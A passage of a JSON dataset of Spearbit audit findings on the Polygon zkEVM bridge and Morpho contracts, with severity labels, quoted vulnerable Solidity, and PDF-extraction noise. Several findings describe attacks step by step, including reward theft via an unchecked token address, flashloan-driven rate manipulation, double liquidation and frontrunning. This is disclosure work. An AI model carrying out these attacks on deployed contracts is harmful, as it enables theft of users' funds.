        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "Seems like the variable veryBatchTimeTarget was meant to be named verifyBatchTimeTarget as evidenced from the comment below: // Check if timestamp is above or below the VERIFY_BATCH_TIME_TARGET",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Add additional comments to function forceBatch()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "The function forceBatch() contains a comment about synch attacks. what is meant by that. The team explained the following: Its not immediately clear  Getting the call data from an EOA is easy/cheap so no need to put the transactions in the event (which is expensive).  Getting the internal call data from internal transactions (which is done via a smart contract) is complicated (because it requires an archival node) and then its worth it to put the transactions in the event, which is easy to query. function forceBatch(...) ... { ... // In order to avoid synch attacks, if the msg.sender is not the origin // Add the transaction bytes in the event if (msg.sender == tx.origin) { emit ForceBatch(lastForceBatch, lastGlobalExitRoot, msg.sender, \"\"); } else { emit ForceBatch(lastForceBatch,lastGlobalExitRoot,msg.sender,transactions); } }",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Check against MAX_VERIFY_BATCHES",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "**In several functions a comparison is made with < MAX_VERIFY_BATCHES. This should probably be <= MAX_VERIFY_BATCHES, otherwise, the MAX will never be reached. uint64 public constant MAX_VERIFY_BATCHES = 1000; function sequenceForceBatches(ForcedBatchData[] memory batches) ... { uint256 batchesNum = batches.length; ... require(batchesNum < MAX_VERIFY_BATCHES, ... ); ... } function sequenceBatches(BatchData[] memory batches) ... { uint256 batchesNum = batches.length; ... require(batchesNum < MAX_VERIFY_BATCHES, ...); ... } function verifyBatches(...) ... { ... require(finalNewBatch - initNumBatch < MAX_VERIFY_BATCHES, ... ); ... }",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Prepare for multiple aggregators/sequencers to improve availability",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "As long are there is one (trusted)sequencer and one (trusted)aggregator the availability risks are relatively high. However, the current code isnt optimized to support multiple trusted sequencers and multiple trusted aggregators. modifier onlyTrustedSequencer() { require(trustedSequencer == msg.sender, ... ); _; } modifier onlyTrustedAggregator() { require(trustedAggregator == msg.sender, ... ); _; }",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Temporary Fund freeze on using Multiple Rollups",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "Claiming of Assets will freeze temporarily if multiple rollups are involved as shown below. The asset will be lost if the transfer is done between: a. Mainnet -> R1 -> R2 b. R1 -> R2 -> Mainnet 1. USDC is bridged from Mainnet to Rollover R1 with its metadata. 2. User claims this and a new Wrapped token is prepared using USDC token and its metadata. bytes32 tokenInfoHash = keccak256(abi.encodePacked(originNetwork, originTokenAddress)); TokenWrapped newWrappedToken = (new TokenWrapped){salt: tokenInfoHash}(name, symbol, decimals); 3. Lets say the User bridge this token to Rollup R2. This will burn the wrapped token on R1 if (tokenInfo.originTokenAddress != address(0)) { // The token is a wrapped token from another network // Burn tokens TokenWrapped(token).burn(msg.sender, amount); originTokenAddress = tokenInfo.originTokenAddress; originNetwork = tokenInfo.originNetwork; } 4. The problem here is now while bridging the metadata was not set. 5. So once the user claims this on R2, wrapped token creation will fail since abi.decode on empty metadata will fail to retrieve name, symbol,... The asset will be temporarily lost since it was bridged properly but cannot be claimed Showing the transaction chain Mainnet bridgeAsset(usdc,R1,0xUser1, 100, )  Transfer 100 USDC to Mainnet M1  originTokenAddress=USDC  originNetwork = Mainnet  metadata = (USDC,USDC,6)  Deposit node created R1 claimAsset(...,Mainnet,USDC,R1,0xUser1,100, metadata = (USDC,USDC,6))  Claim veried  Marked claimed  tokenInfoHash derived from originNetwork, originTokenAddress which is Mainnet, USDC  tokenInfoToWrappedToken[Mainnet,USDC] created using metadata = (USDC,USDC,6)  User minted 100 amount of tokenInfoToWrappedToken[Mainnet, USDC] bridgeAsset(tokenInfoToWrappedToken[Mainnet,USDC],R2,0xUser2, 100, )  Burn 100 tokenInfoToWrappedToken[Mainnet,USDC]  originTokenAddress=USDC  originNetwork = Mainnet 36  metadata = \"\"  Deposit node created with empty metadata R2 claimAsset(...,Mainnet,USDC,R2,0xUser2,100, metadata = \"\")  Claim veried  Marked claimed  tokenInfoHash derived from originNetwork, originTokenAddress which is Mainnet, USDC  Since metadata = \"\" , abi decode fails",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Off by one error when comparing with MAX_TRANSACTIONS_BYTE_LENGTH constant",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "When comparing against MAX_TRANSACTIONS_BYTE_LENGTH, the valid range should be <= instead of <. require( transactions.length < MAX_TRANSACTIONS_BYTE_LENGTH, \"PolygonZkEVM::forceBatch: Transactions bytes overflow\" ); require( currentBatch.transactions.length < MAX_TRANSACTIONS_BYTE_LENGTH, \"PolygonZkEVM::sequenceBatches: Transactions bytes overflow\" );",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Informational"
        ]
    },
    {
        "title": "trustedAggregatorTimeout value may impact batchFees",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "If trustedAggregatorTimeout and veryBatchTimeTarget are valued nearby then all batches veri- ed by 3rd party will be above target (totalBatchesAboveTarget) and this would impact batch fees. 1. Lets say veryBatchTimeTarget is 30 min and trustedAggregatorTimeout is 31 min. 2. Now anyone can call verifyBatches only after 31 min due to the below condition. 37 require( ); sequencedBatches[finalNewBatch].sequencedTimestamp + trustedAggregatorTimeout <= block.timestamp, \"PolygonZkEVM::verifyBatches: Trusted aggregator timeout not expired\" 3. This means _updateBatchFee can at minimum be called after 31 min of sequencing by a nontrusted aggre- gator. 4. The below condition then always returns true. if ( // 31>30 ) { block.timestamp - currentSequencedBatchData.sequencedTimestamp >veryBatchTimeTarget",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Largest allowed batch fee multiplier is 1023 instead of 1024",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "Per the setMultiplierBatchFee function, the largest allowed batch fee multiplier is 1023. /** * @notice Allow the admin to set a new multiplier batch fee * @param newMultiplierBatchFee multiplier bathc fee */ function setMultiplierBatchFee( uint16 newMultiplierBatchFee ) public onlyAdmin { require( newMultiplierBatchFee >= 1000 && newMultiplierBatchFee < 1024, \"PolygonZkEVM::setMultiplierBatchFee: newMultiplierBatchFee incorrect range\" ); multiplierBatchFee = newMultiplierBatchFee; emit SetMultiplierBatchFee(newMultiplierBatchFee); } However, the comment mentioned that the largest allowed is 1024. // Batch fee multiplier with 3 decimals that goes from 1000 - 1024 uint16 public multiplierBatchFee;",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Deposit token associated Risk Awareness",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "The deposited tokens locked in L1 could be at risk due to external conditions like the one shown below: 1. Assume there is a huge amount of token X being bridged to roll over. 2. Now mainnet will have a huge balance of token X. 3. Unfortunately due to a hack or LUNA like condition, the project owner takes a snapshot of the current token X balance for each user address and later all these addresses will be airdropped with a new token based on screenshot value. 4. In this case, token X in mainnet will be screenshot but at disbursal time the newly updated token will be airdropped to mainnet and not the user. 5. Now there is no emergencywithdraw method to get these airdropped funds out. 6. For the users, if they claim funds they still get token X which is worthless.",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Fees might get stuck when Aggregator is unable to verify",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "The collected fees from Sequencer will be stuck in the contract if Aggregator is unable to verify the batch. In this case, Aggregator will not be paid and the batch transaction fee will get stuck in the contract",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider using OpenZeppelins ECDSA library over ecrecover",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "As stated here, ecrecover is vulnerable to a signature malleability attack. While the code in permit is not vulnerable since a nonce is used in the signed data, Id still recommend using OpenZeppelins ECDSA library, as it does the malleability safety check for you as well as the signer != address(0) check done on the next line.",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Risk of transactions not yet in Consolidated state on L2",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "There is are relatively long period for batches and thus transactions are to be between Trusted state and Consolidated state. Normally around 30 minutes but in exceptional situations up to 2 weeks. On the L2, users normally interact with the Trusted state. However, they should be aware of the risk for high-value transactions (especially for transactions that cant be undone, like transactions that have an effect outside of the L2, like off ramps, OTC transactions, alternative bridges, etc). There will be custom RPC endpoints that can be used to retrieve status information, see zkevm.go.",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Delay of bridging from L2 to L1",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "The bridge uses the Consolidated state while bridging from L2 to L1 and the user interface It can take between 15 min and 1 hour.\". Other (opti- public.zkevm-test.net, shows \"Waiting for validity proof. mistic) bridges use liquidity providers who take the risk and allow users to retrieve funds in a shorter amount of time (for a fee).",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Missing Natspec documentation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "Some NatSpec comments are either missing or are incomplete.  Missing NatSpec comment for pendingStateNum: /** * @notice Verify batches internal function * @param initNumBatch Batch which the aggregator starts the verification * @param finalNewBatch Last batch aggregator intends to verify * @param newLocalExitRoot * @param newStateRoot New State root once the batch is processed * @param proofA zk-snark input * @param proofB zk-snark input * @param proofC zk-snark input */ function _verifyBatches( New local exit root once the batch is processed uint64 pendingStateNum, uint64 initNumBatch, uint64 finalNewBatch, bytes32 newLocalExitRoot, bytes32 newStateRoot, uint256[2] calldata proofA, uint256[2][2] calldata proofB, uint256[2] calldata proofC ) internal {  Missing NatSpec comment for pendingStateTimeout: /** * @notice Struct to call initialize, this basically saves gas becasue pack the parameters that can be packed , * and avoid stack too deep errors. * @param admin Admin address * @param chainID L2 chainID * @param trustedSequencer Trusted sequencer address * @param forceBatchAllowed Indicates wheather the force batch functionality is available * @param trustedAggregator Trusted aggregator * @param trustedAggregatorTimeout Trusted aggregator timeout */ struct InitializePackedParameters { address admin; uint64 chainID; address trustedSequencer; uint64 pendingStateTimeout; bool forceBatchAllowed; address trustedAggregator; uint64 trustedAggregatorTimeout; }",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Informational"
        ]
    },
    {
        "title": "_minDelay could be 0 without emergency",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "Normally min delay is only supposed to be 0 when in an emergency state. But this could be made to 0 even in nonemergency mode as shown below: 1. Proposer can propose an operation for changing _minDelay to 0 via updateDelay function. 2. Now, if this operation is executed by the executor then _minDelay will be 0 even without an emergency state. **",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Incorrect/incomplete comment",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "There are a few mistakes in the comments that can be corrected in the codebase.",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Typos, grammatical and styling errors",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "There are a few typos and grammatical mistakes that can be corrected in the codebase. Some functions could also be renamed to better reect their purposes.",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Enforce parameters limits in initialize() of PolygonZkEVM",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "The function initialize() of PolygonZkEVM doesnt enforce limits on trustedAggregatorTime- out and pendingStateTimeout, whereas the update functions setTrustedAggregatorTimeout() and setPend- ingStateTimeout(). As the project has indicated it might be useful to set larger values in initialize(). function initialize(..., InitializePackedParameters calldata initializePackedParameters,...) ... { trustedAggregatorTimeout = initializePackedParameters.trustedAggregatorTimeout; ... pendingStateTimeout = initializePackedParameters.pendingStateTimeout; ... } function setTrustedAggregatorTimeout(uint64 newTrustedAggregatorTimeout) public onlyAdmin { require(newTrustedAggregatorTimeout <= HALT_AGGREGATION_TIMEOUT,....); ... trustedAggregatorTimeout = newTrustedAggregatorTimeout; ... } function setPendingStateTimeout(uint64 newPendingStateTimeout) public onlyAdmin { require(newPendingStateTimeout <= HALT_AGGREGATION_TIMEOUT, ... ); ... pendingStateTimeout = newPendingStateTimeout; ... }",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Findings . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 48 2 1 About Spearbit Spearbit is a decentralized network of expert security engineers offering reviews and other security related services to Web3 projects with the goal of creating a stronger ecosystem. Our network has experience on every part of the blockchain technology stack, including but not limited to protocol design, smart contracts and the Solidity compiler. Spearbit brings in untapped security talent by enabling expert freelance auditors seeking exibility to work on interesting projects together. Learn more about us at spearbit.com 2 Introduction Smart contract implementation which will be used by the Polygon-Hermez zkEVM. Disclaimer : This security review does not guarantee against a hack. It is a snapshot in time of zkEVM-Contracts according to the specic commit. Any modications to the code will require a new security review. 3 Risk classication Severity level Likelihood: high Likelihood: medium High Likelihood: low Medium Impact: High Impact: Medium Impact: Low Critical High Medium Low Medium Low Low 3.1 Impact  High - leads to a loss of a signicant portion (>10%) of assets in the protocol, or signicant harm to a majority of users.  Medium - global losses <10% or losses to only a subset of users, but still unacceptable.  Low - losses will be annoying but bearable--applies to things like grieng attacks that can be easily repaired or even gas inefciencies. 3.2 Likelihood  High - almost certain to happen, easy to perform, or not easy but highly incentivized  Medium - only conditionally possible or incentivized, but still relatively likely  Low - requires stars to align, or little-to-no incentive 3.3 Action required for severity levels  Critical - Must x as soon as possible (if already deployed)  High - Must x (before deployment if not already deployed)  Medium - Should x  Low - Could x 4 Executive Summary Over the course of 13 days in total, Polygon engaged with Spearbit to review the zkevm-contracts protocol. In this period of time a total of 68 issues were found. 3 Summary Project Name Polygon Repository Commit zkevm-contracts 5de59e...f899 Type of Project Cross Chain, Bridge Audit Timeline Jan 9 - Jan 25 Two week x period Jan 25 - Feb 8 Severity Critical Risk High Risk Medium Risk Low Risk Gas Optimizations Informational Total Issues Found Count Fixed Acknowledged 0 0 3 16 19 30 68 0 0 3 10 18 19 50 0 0 0 6 1 11 18 4 5 Findings 5.1 Medium Risk 5.1.1 Funds can be sent to a non existing destination",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "The function bridgeAsset() and bridgeMessage() do check that the destination network is different If accidentally the wrong than the current network. However, they dont check if the destination network exists. networkId is given as a parameter, then the function is sent to a nonexisting network. If the network would be deployed in the future the funds would be recovered. However, in the meantime they are inaccessible and thus lost for the sender and recipient. Note: other bridges usually have validity checks on the destination. function bridgeAsset(...) ... { require(destinationNetwork != networkID, ... ); ... } function bridgeMessage(...) ... { require(destinationNetwork != networkID, ... ); ... }",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Wrong P2P exchange rate calculation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
        "body": "_p2pDelta is divided by _poolIndex and multiplied by _p2pRate, nevertheless it should have been multiplied by _poolIndex and divided by _p2pRate to compute the correct share of the delta. This leads to wrong P2P rates throughout all markets if supply / borrow delta is involved.",
        "labels": [
            "Spearbit",
            "Morpho",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "MatchingEngineForAave is using the wrong totalSupply in updateBorrowers",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
        "body": "_poolTokenAddress is referencing AToken so the totalStaked would be the total supply of the AToken. In this case, the totalStaked should reference the total supply of the DebtToken, otherwise the user would be rewarded for a wrong amount of reward.",
        "labels": [
            "Spearbit",
            "Morpho",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "RewardsManagerAave does not verify token addresses",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
        "body": "Aave has 3 different types of tokens: aToken, stable debt token and variable debt token (a/s/vToken). Aaves incentive controller can define rewards for all of them but Morpho never uses a stable-rate borrows token (sToken). The public accrueUserUnclaimedRewards function allows passing arbitrary token addresses for which to accrue user rewards. Current code assumes that if the token is not the variable debt token, then it must be the aToken, and uses the users supply balance for the reward calculation as follows: 5 uint256 stakedByUser = reserve.variableDebtTokenAddress == asset ? positionsManager.borrowBalanceInOf(reserve.aTokenAddress, _user).onPool : positionsManager.supplyBalanceInOf(reserve.aTokenAddress, _user).onPool; An attacker can accrue rewards by passing in an sToken address and steal from the contract, i.e:  Attacker supplies a large amount of tokens for which sToken rewards are defined.  The aToken reward index is updated to the latest index but the sToken index is not initialized.  Attacker calls accrueUserUnclaimedRewards([sToken]), which will compute the difference between the cur- rent Aave reward index and users sToken index, then multiply it by their supply balance.  The user accumulated rewards in userUnclaimedRewards[user] can be withdrawn by calling PositionMan- ager.claimRewards([sToken, ...]).  Attacker withdraws their supplied tokens again. The abovementioned steps can be performed in one single transaction to steal unclaimed rewards from all Morpho positions.",
        "labels": [
            "Spearbit",
            "Morpho",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "FullMath requires overflow behavior",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
        "body": "UniswapV3s FullMath.sol is copied and migrated from an old solidity version to version 0.8 which reverts on overflows but the old FullMath relies on the implicit overflow behavior. The current code will revert on overflows when it should not, breaking the SwapManagerUniV3 contract.",
        "labels": [
            "Spearbit",
            "Morpho",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Morphos USDT mainnet market can end up in broken state",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
        "body": "Note that USDT on Ethereum mainnet is non-standard and requires resetting the approval to zero (see USDT L199) before being able to change it again. In _repayERC20ToPool , it could be that _amount is approved but then _amount = Math.min(...) only repays a smaller amount, meaning there remains a non-zero approval for Aave. Any further _repayERC20ToPool/_- supplyERC20ToPool calls will then revert in the approve call. Users cannot interact with most functions of the Morpho USDT market anymore. Example: Assume the attacker is first to borrow from the USDT market on Morpho.  Attacker borrows 1000 USDT through Morpho from the Aave pool (and some other collateral to cover the debt).  Attacker directly interacts with Aave to repay 1 USDT of debt for Aaves Morpho account position.  Attacker attempts to repay 1000 USDT on Morpho. the contracts debt balance is only 999 and the _amount = Math.min(_amount, variableDebtTo- ken.scaledBalanceOf(address(this)).mulWadByRay(_normalizedVariableDebt) computation will only repay 999. An approval of 1 USDT remains. It will approve 1000 USDT but  The USDT market is broken as it reverts on supply / repay calls when trying to approve the new amount",
        "labels": [
            "Spearbit",
            "Morpho",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Wrong reserve factor computation on P2P rates",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
        "body": "The reserve factor is taken on the entire P2P supply and borrow rates instead of just on the spread of the pool rates. Its currently overcharging suppliers and borrowers and making it possible to earn a worse rate on Morpho than the pool rates. supplyP2PSPY[_marketAddress] = (meanSPY * (MAX_BASIS_POINTS - reserveFactor[_marketAddress])) / MAX_BASIS_POINTS; borrowP2PSPY[_marketAddress] = (meanSPY * (MAX_BASIS_POINTS + reserveFactor[_marketAddress])) / MAX_BASIS_POINTS;",
        "labels": [
            "Spearbit",
            "Morpho",
            "Severity: High Risk"
        ]
    },
    {
        "title": "SwapManager assumes Morpho token is token0 of every token pair",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
        "body": "The consult function wrongly assumes that the Morpho token is always the first token (token0) in the Morpho <> Reward token token pair. This could lead to inverted prices and a denial of service attack when claiming rewards as the wrongly calculated expected amount slippage check reverts.",
        "labels": [
            "Spearbit",
            "Morpho",
            "Severity: High Risk"
        ]
    },
    {
        "title": "SwapManager fails at updating TWAP",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
        "body": "The update function returns early without updating the TWAP if the elapsed time is past the TWAP period. Meaning, once the TWAP period passed the TWAP is stale and forever represents an old value. This could lead to a denial of service attack when claiming rewards as the wrongly calculated expected amount slippage check reverts.",
        "labels": [
            "Spearbit",
            "Morpho",
            "Severity: High Risk"
        ]
    },
    {
        "title": "P2P rate can be manipulated as its a lazy-updated snapshot",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
        "body": "The P2P rate is lazy-updated upon interactions with the Morpho protocol. It takes the mid-rate of Its possible to manipulate these rates before triggering an update on the current Aave supply and borrow rate. Morpho. function _updateSPYs(address _marketAddress) internal { DataTypes.ReserveData memory reserveData = lendingPool.getReserveData( IAToken(_marketAddress).UNDERLYING_ASSET_ADDRESS() ); uint256 meanSPY = Math.average( reserveData.currentLiquidityRate, reserveData.currentVariableBorrowRate ) / SECONDS_PER_YEAR; // In ray } Example: Assume an attacker has a P2P supply position on Morpho and wants to earn a very high APY on it. He does the following actions in a single transaction:  Borrow all funds on the desired Aave market. (This can be done by borrowing against flashloaned collateral).  The utilisation rate of the market is now 100%. The borrow rate is the max borrow rate and the supply rate is (1.0 - reserveFactor) * maxBorrowRate. The max borrow rate can be higher than 100% APY, see Aave docs.  The attacker triggers an update to the P2P rate, for example, by supplying 1 token to the pool Positions- ManagerForAave.supply(poolTokenAddress, 1, ...), triggering marketsManager.updateSPYs(_poolTo- kenAddress).  The new mid-rate is computed which will be (2.0 - reserveFactor) * maxBorrowRate / 2 ~ maxBor- rowRate.  The attacker repays their Aave debt in the same transaction, not paying any interest on it.  All P2P borrowers now pay the max borrow rate to the P2P suppliers until the next time a user interacts with the market on Morpho.  This process can be repeated to keep the APY high.",
        "labels": [
            "Spearbit",
            "Morpho",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Liquidating Morphos Aave position leads to state desynchronization",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
        "body": "Morpho has a single position on Aave that encompasses all of Morphos individual user positions that are on the pool. When this Aave Morpho position is liquidated the user position state tracked in Morpho desynchronize from the actual Aave position. This leads to issues when users try to withdraw their collateral or repay their debt from Morpho. Its also possible to double-liquidate for a profit. Example: Theres a single borrower B1 on Morpho who is connected to the Aave pool.  B1 supplies 1 ETH and borrows 2500 DAI. This creates a position on Aave for Morpho  The ETH price crashes and the position becomes liquidatable.  A liquidator liquidates the position on Aave, earning the liquidation bonus. They repaid some debt and seized some collateral for profit.  This repaid debt / removed collateral is not synced with Morpho. The users supply and debt balance remain 1 ETH and 2500 DAI. The same user on Morpho can be liquidated again because Morpho uses the exact same liquidation parameters as Aave.  The Morpho liquidation call again repays debt on the Aave position and withdraws collateral with a second liquidation bonus.  The state remains desynced.",
        "labels": [
            "Spearbit",
            "Morpho",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Frontrunners can exploit the system by not allowing head of DLL to match in P2P",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
        "body": "For a given asset X, liquidity is supplied on the pool since there are not enough borrowers. suppli- ersOnPool head: 0xa with 1000 units of x Whenever there is a new transaction in the mempool to borrow 100 units of x:  Frontrunner supplies 1001 units of x and is supplied on pool.  updateSuppliers will place the frontrunner on the head (assuming very high gas is supplied).  Borrowers transaction lands and is matched 100 units of x with a frontrunner in p2p.  Frontrunner withdraws the remaining 901 left which was on the underlying pool. Favorable conditions for an attack:  Relatively fewer gas fees & relatively high block gas limit.  insertSorted is able to traverse to head within block gas limit (i.e length of DLL). Since this is a non-atomic sandwich, the frontrunner needs excessive capital for a blocks time period.",
        "labels": [
            "Spearbit",
            "Morpho",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "TWAP intervals should be flexible as per market conditions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
        "body": "The protocol is using the same TWAP_INTERVAL for both weth-morpho and weth-reward token pool while their liquidity and activity might be different. It should use separate appropriate values for both pools.",
        "labels": [
            "Spearbit",
            "Morpho",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "PositionsManagerForAave claimToTreasury could allow sending underlying to 0x address",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
        "body": "claimToTreasury is currently not verifying if the treasuryVault address is != address(0). In the current state, it would allow the owner of the contract to burn the underlying token instead of sending it to the intended treasury address.",
        "labels": [
            "Spearbit",
            "Morpho",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "rewardsManager used in MatchingEngineForAave could be not initialized",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
        "body": "MatchingEngineForAave update the userUnclaimedRewards for a supplier/borrower each time it gets updated. rewardsManager is not initialized in PositionsManagerForAaveLogic.initialize but only via Po- sitionsManagerForAaveGettersSetters.setRewardsManager, which means that it will start as address(0). Each time a supplier or borrower gets updated and the rewardsManager address is empty, the transaction will revert. To replicate the issue, just comment positionsManager.setRewardsManager(address(rewardsManager)); in TestSetup and run make c-TestSupply. All tests will fail with [FAIL. Reason: Address: low-level delegate call failed]",
        "labels": [
            "Spearbit",
            "Morpho",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Missing input validation checks on contract initialize/constructor",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
        "body": "Contract creation/initialization of a contract in a wrong/inconsistent state. initialize/constructor input parameters should always be validated to prevent the",
        "labels": [
            "Spearbit",
            "Morpho",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Setting a new rewards manager breaks claiming old rewards",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
        "body": "Setting a new rewards manager will break any old unclaimed rewards as users can only claim through the PositionManager.claimRewards function which then uses the new reward manager.",
        "labels": [
            "Spearbit",
            "Morpho",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Low/high MaxGas values could make match/unmatch supplier/borrower functions always fail or revert",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
        "body": "maxGas variable is used to determine how much gas the matchSuppliers, unmatchSuppliers, matchBorrowers and unmatchBorrowers can consume while trying to match/unmatch supplier/borrower and also updating their position if matched.  maxGas = 0 will make entirely skip the loop.  maxGas low would make the loop run at least one time but the smaller maxGas is the higher is the possibility that not all the available suppliers/borrowers are matched/unmatched.  maxGas could make the loop consume all the block gas, making the tx revert. Note that maxGas can be overriden by the user when calling supply, borrow",
        "labels": [
            "Spearbit",
            "Morpho",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "NDS min/max value should be properly validated to avoid tx to always fail/skip loop",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
        "body": "PositionsManagerForAaveLogic is currently initialized with a default value of NDS = 20. The NDS value is used by MatchingEngineForAave when it needs to call DoubleLinkedList.insertSorted in both updateBorrowers and updateSuppliers updateBorrowers, updateSuppliers are called by  MatchingEngineForAavematchBorrowers  MatchingEngineForAaveunmatchBorrowers  MatchingEngineForAavematchSuppliers  MatchingEngineForAaveunmatchSuppliers Those functions and also directly updateBorrowers and updateSuppliers are also called by PositionsManager- ForAaveLogic Problems:  A low NDS value would make the loop inside insertSorted exit early, increasing the probability of a sup- plier/borrower to be added to the tail of the list. This is something that Morpho would like to avoid because it would decrease protocol performance when it needs to match/unmatch suppliers/borrowers.  In the case where a list is long enough, a very high value would make the tranaction revert each time one of those function directly or indirectly call insertSorted. The gas rail guard present in the match/unmatch supplier/borrow is useless because the loop would be called at least one time.",
        "labels": [
            "Spearbit",
            "Morpho",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Initial SwapManager cumulative prices values are wrong",
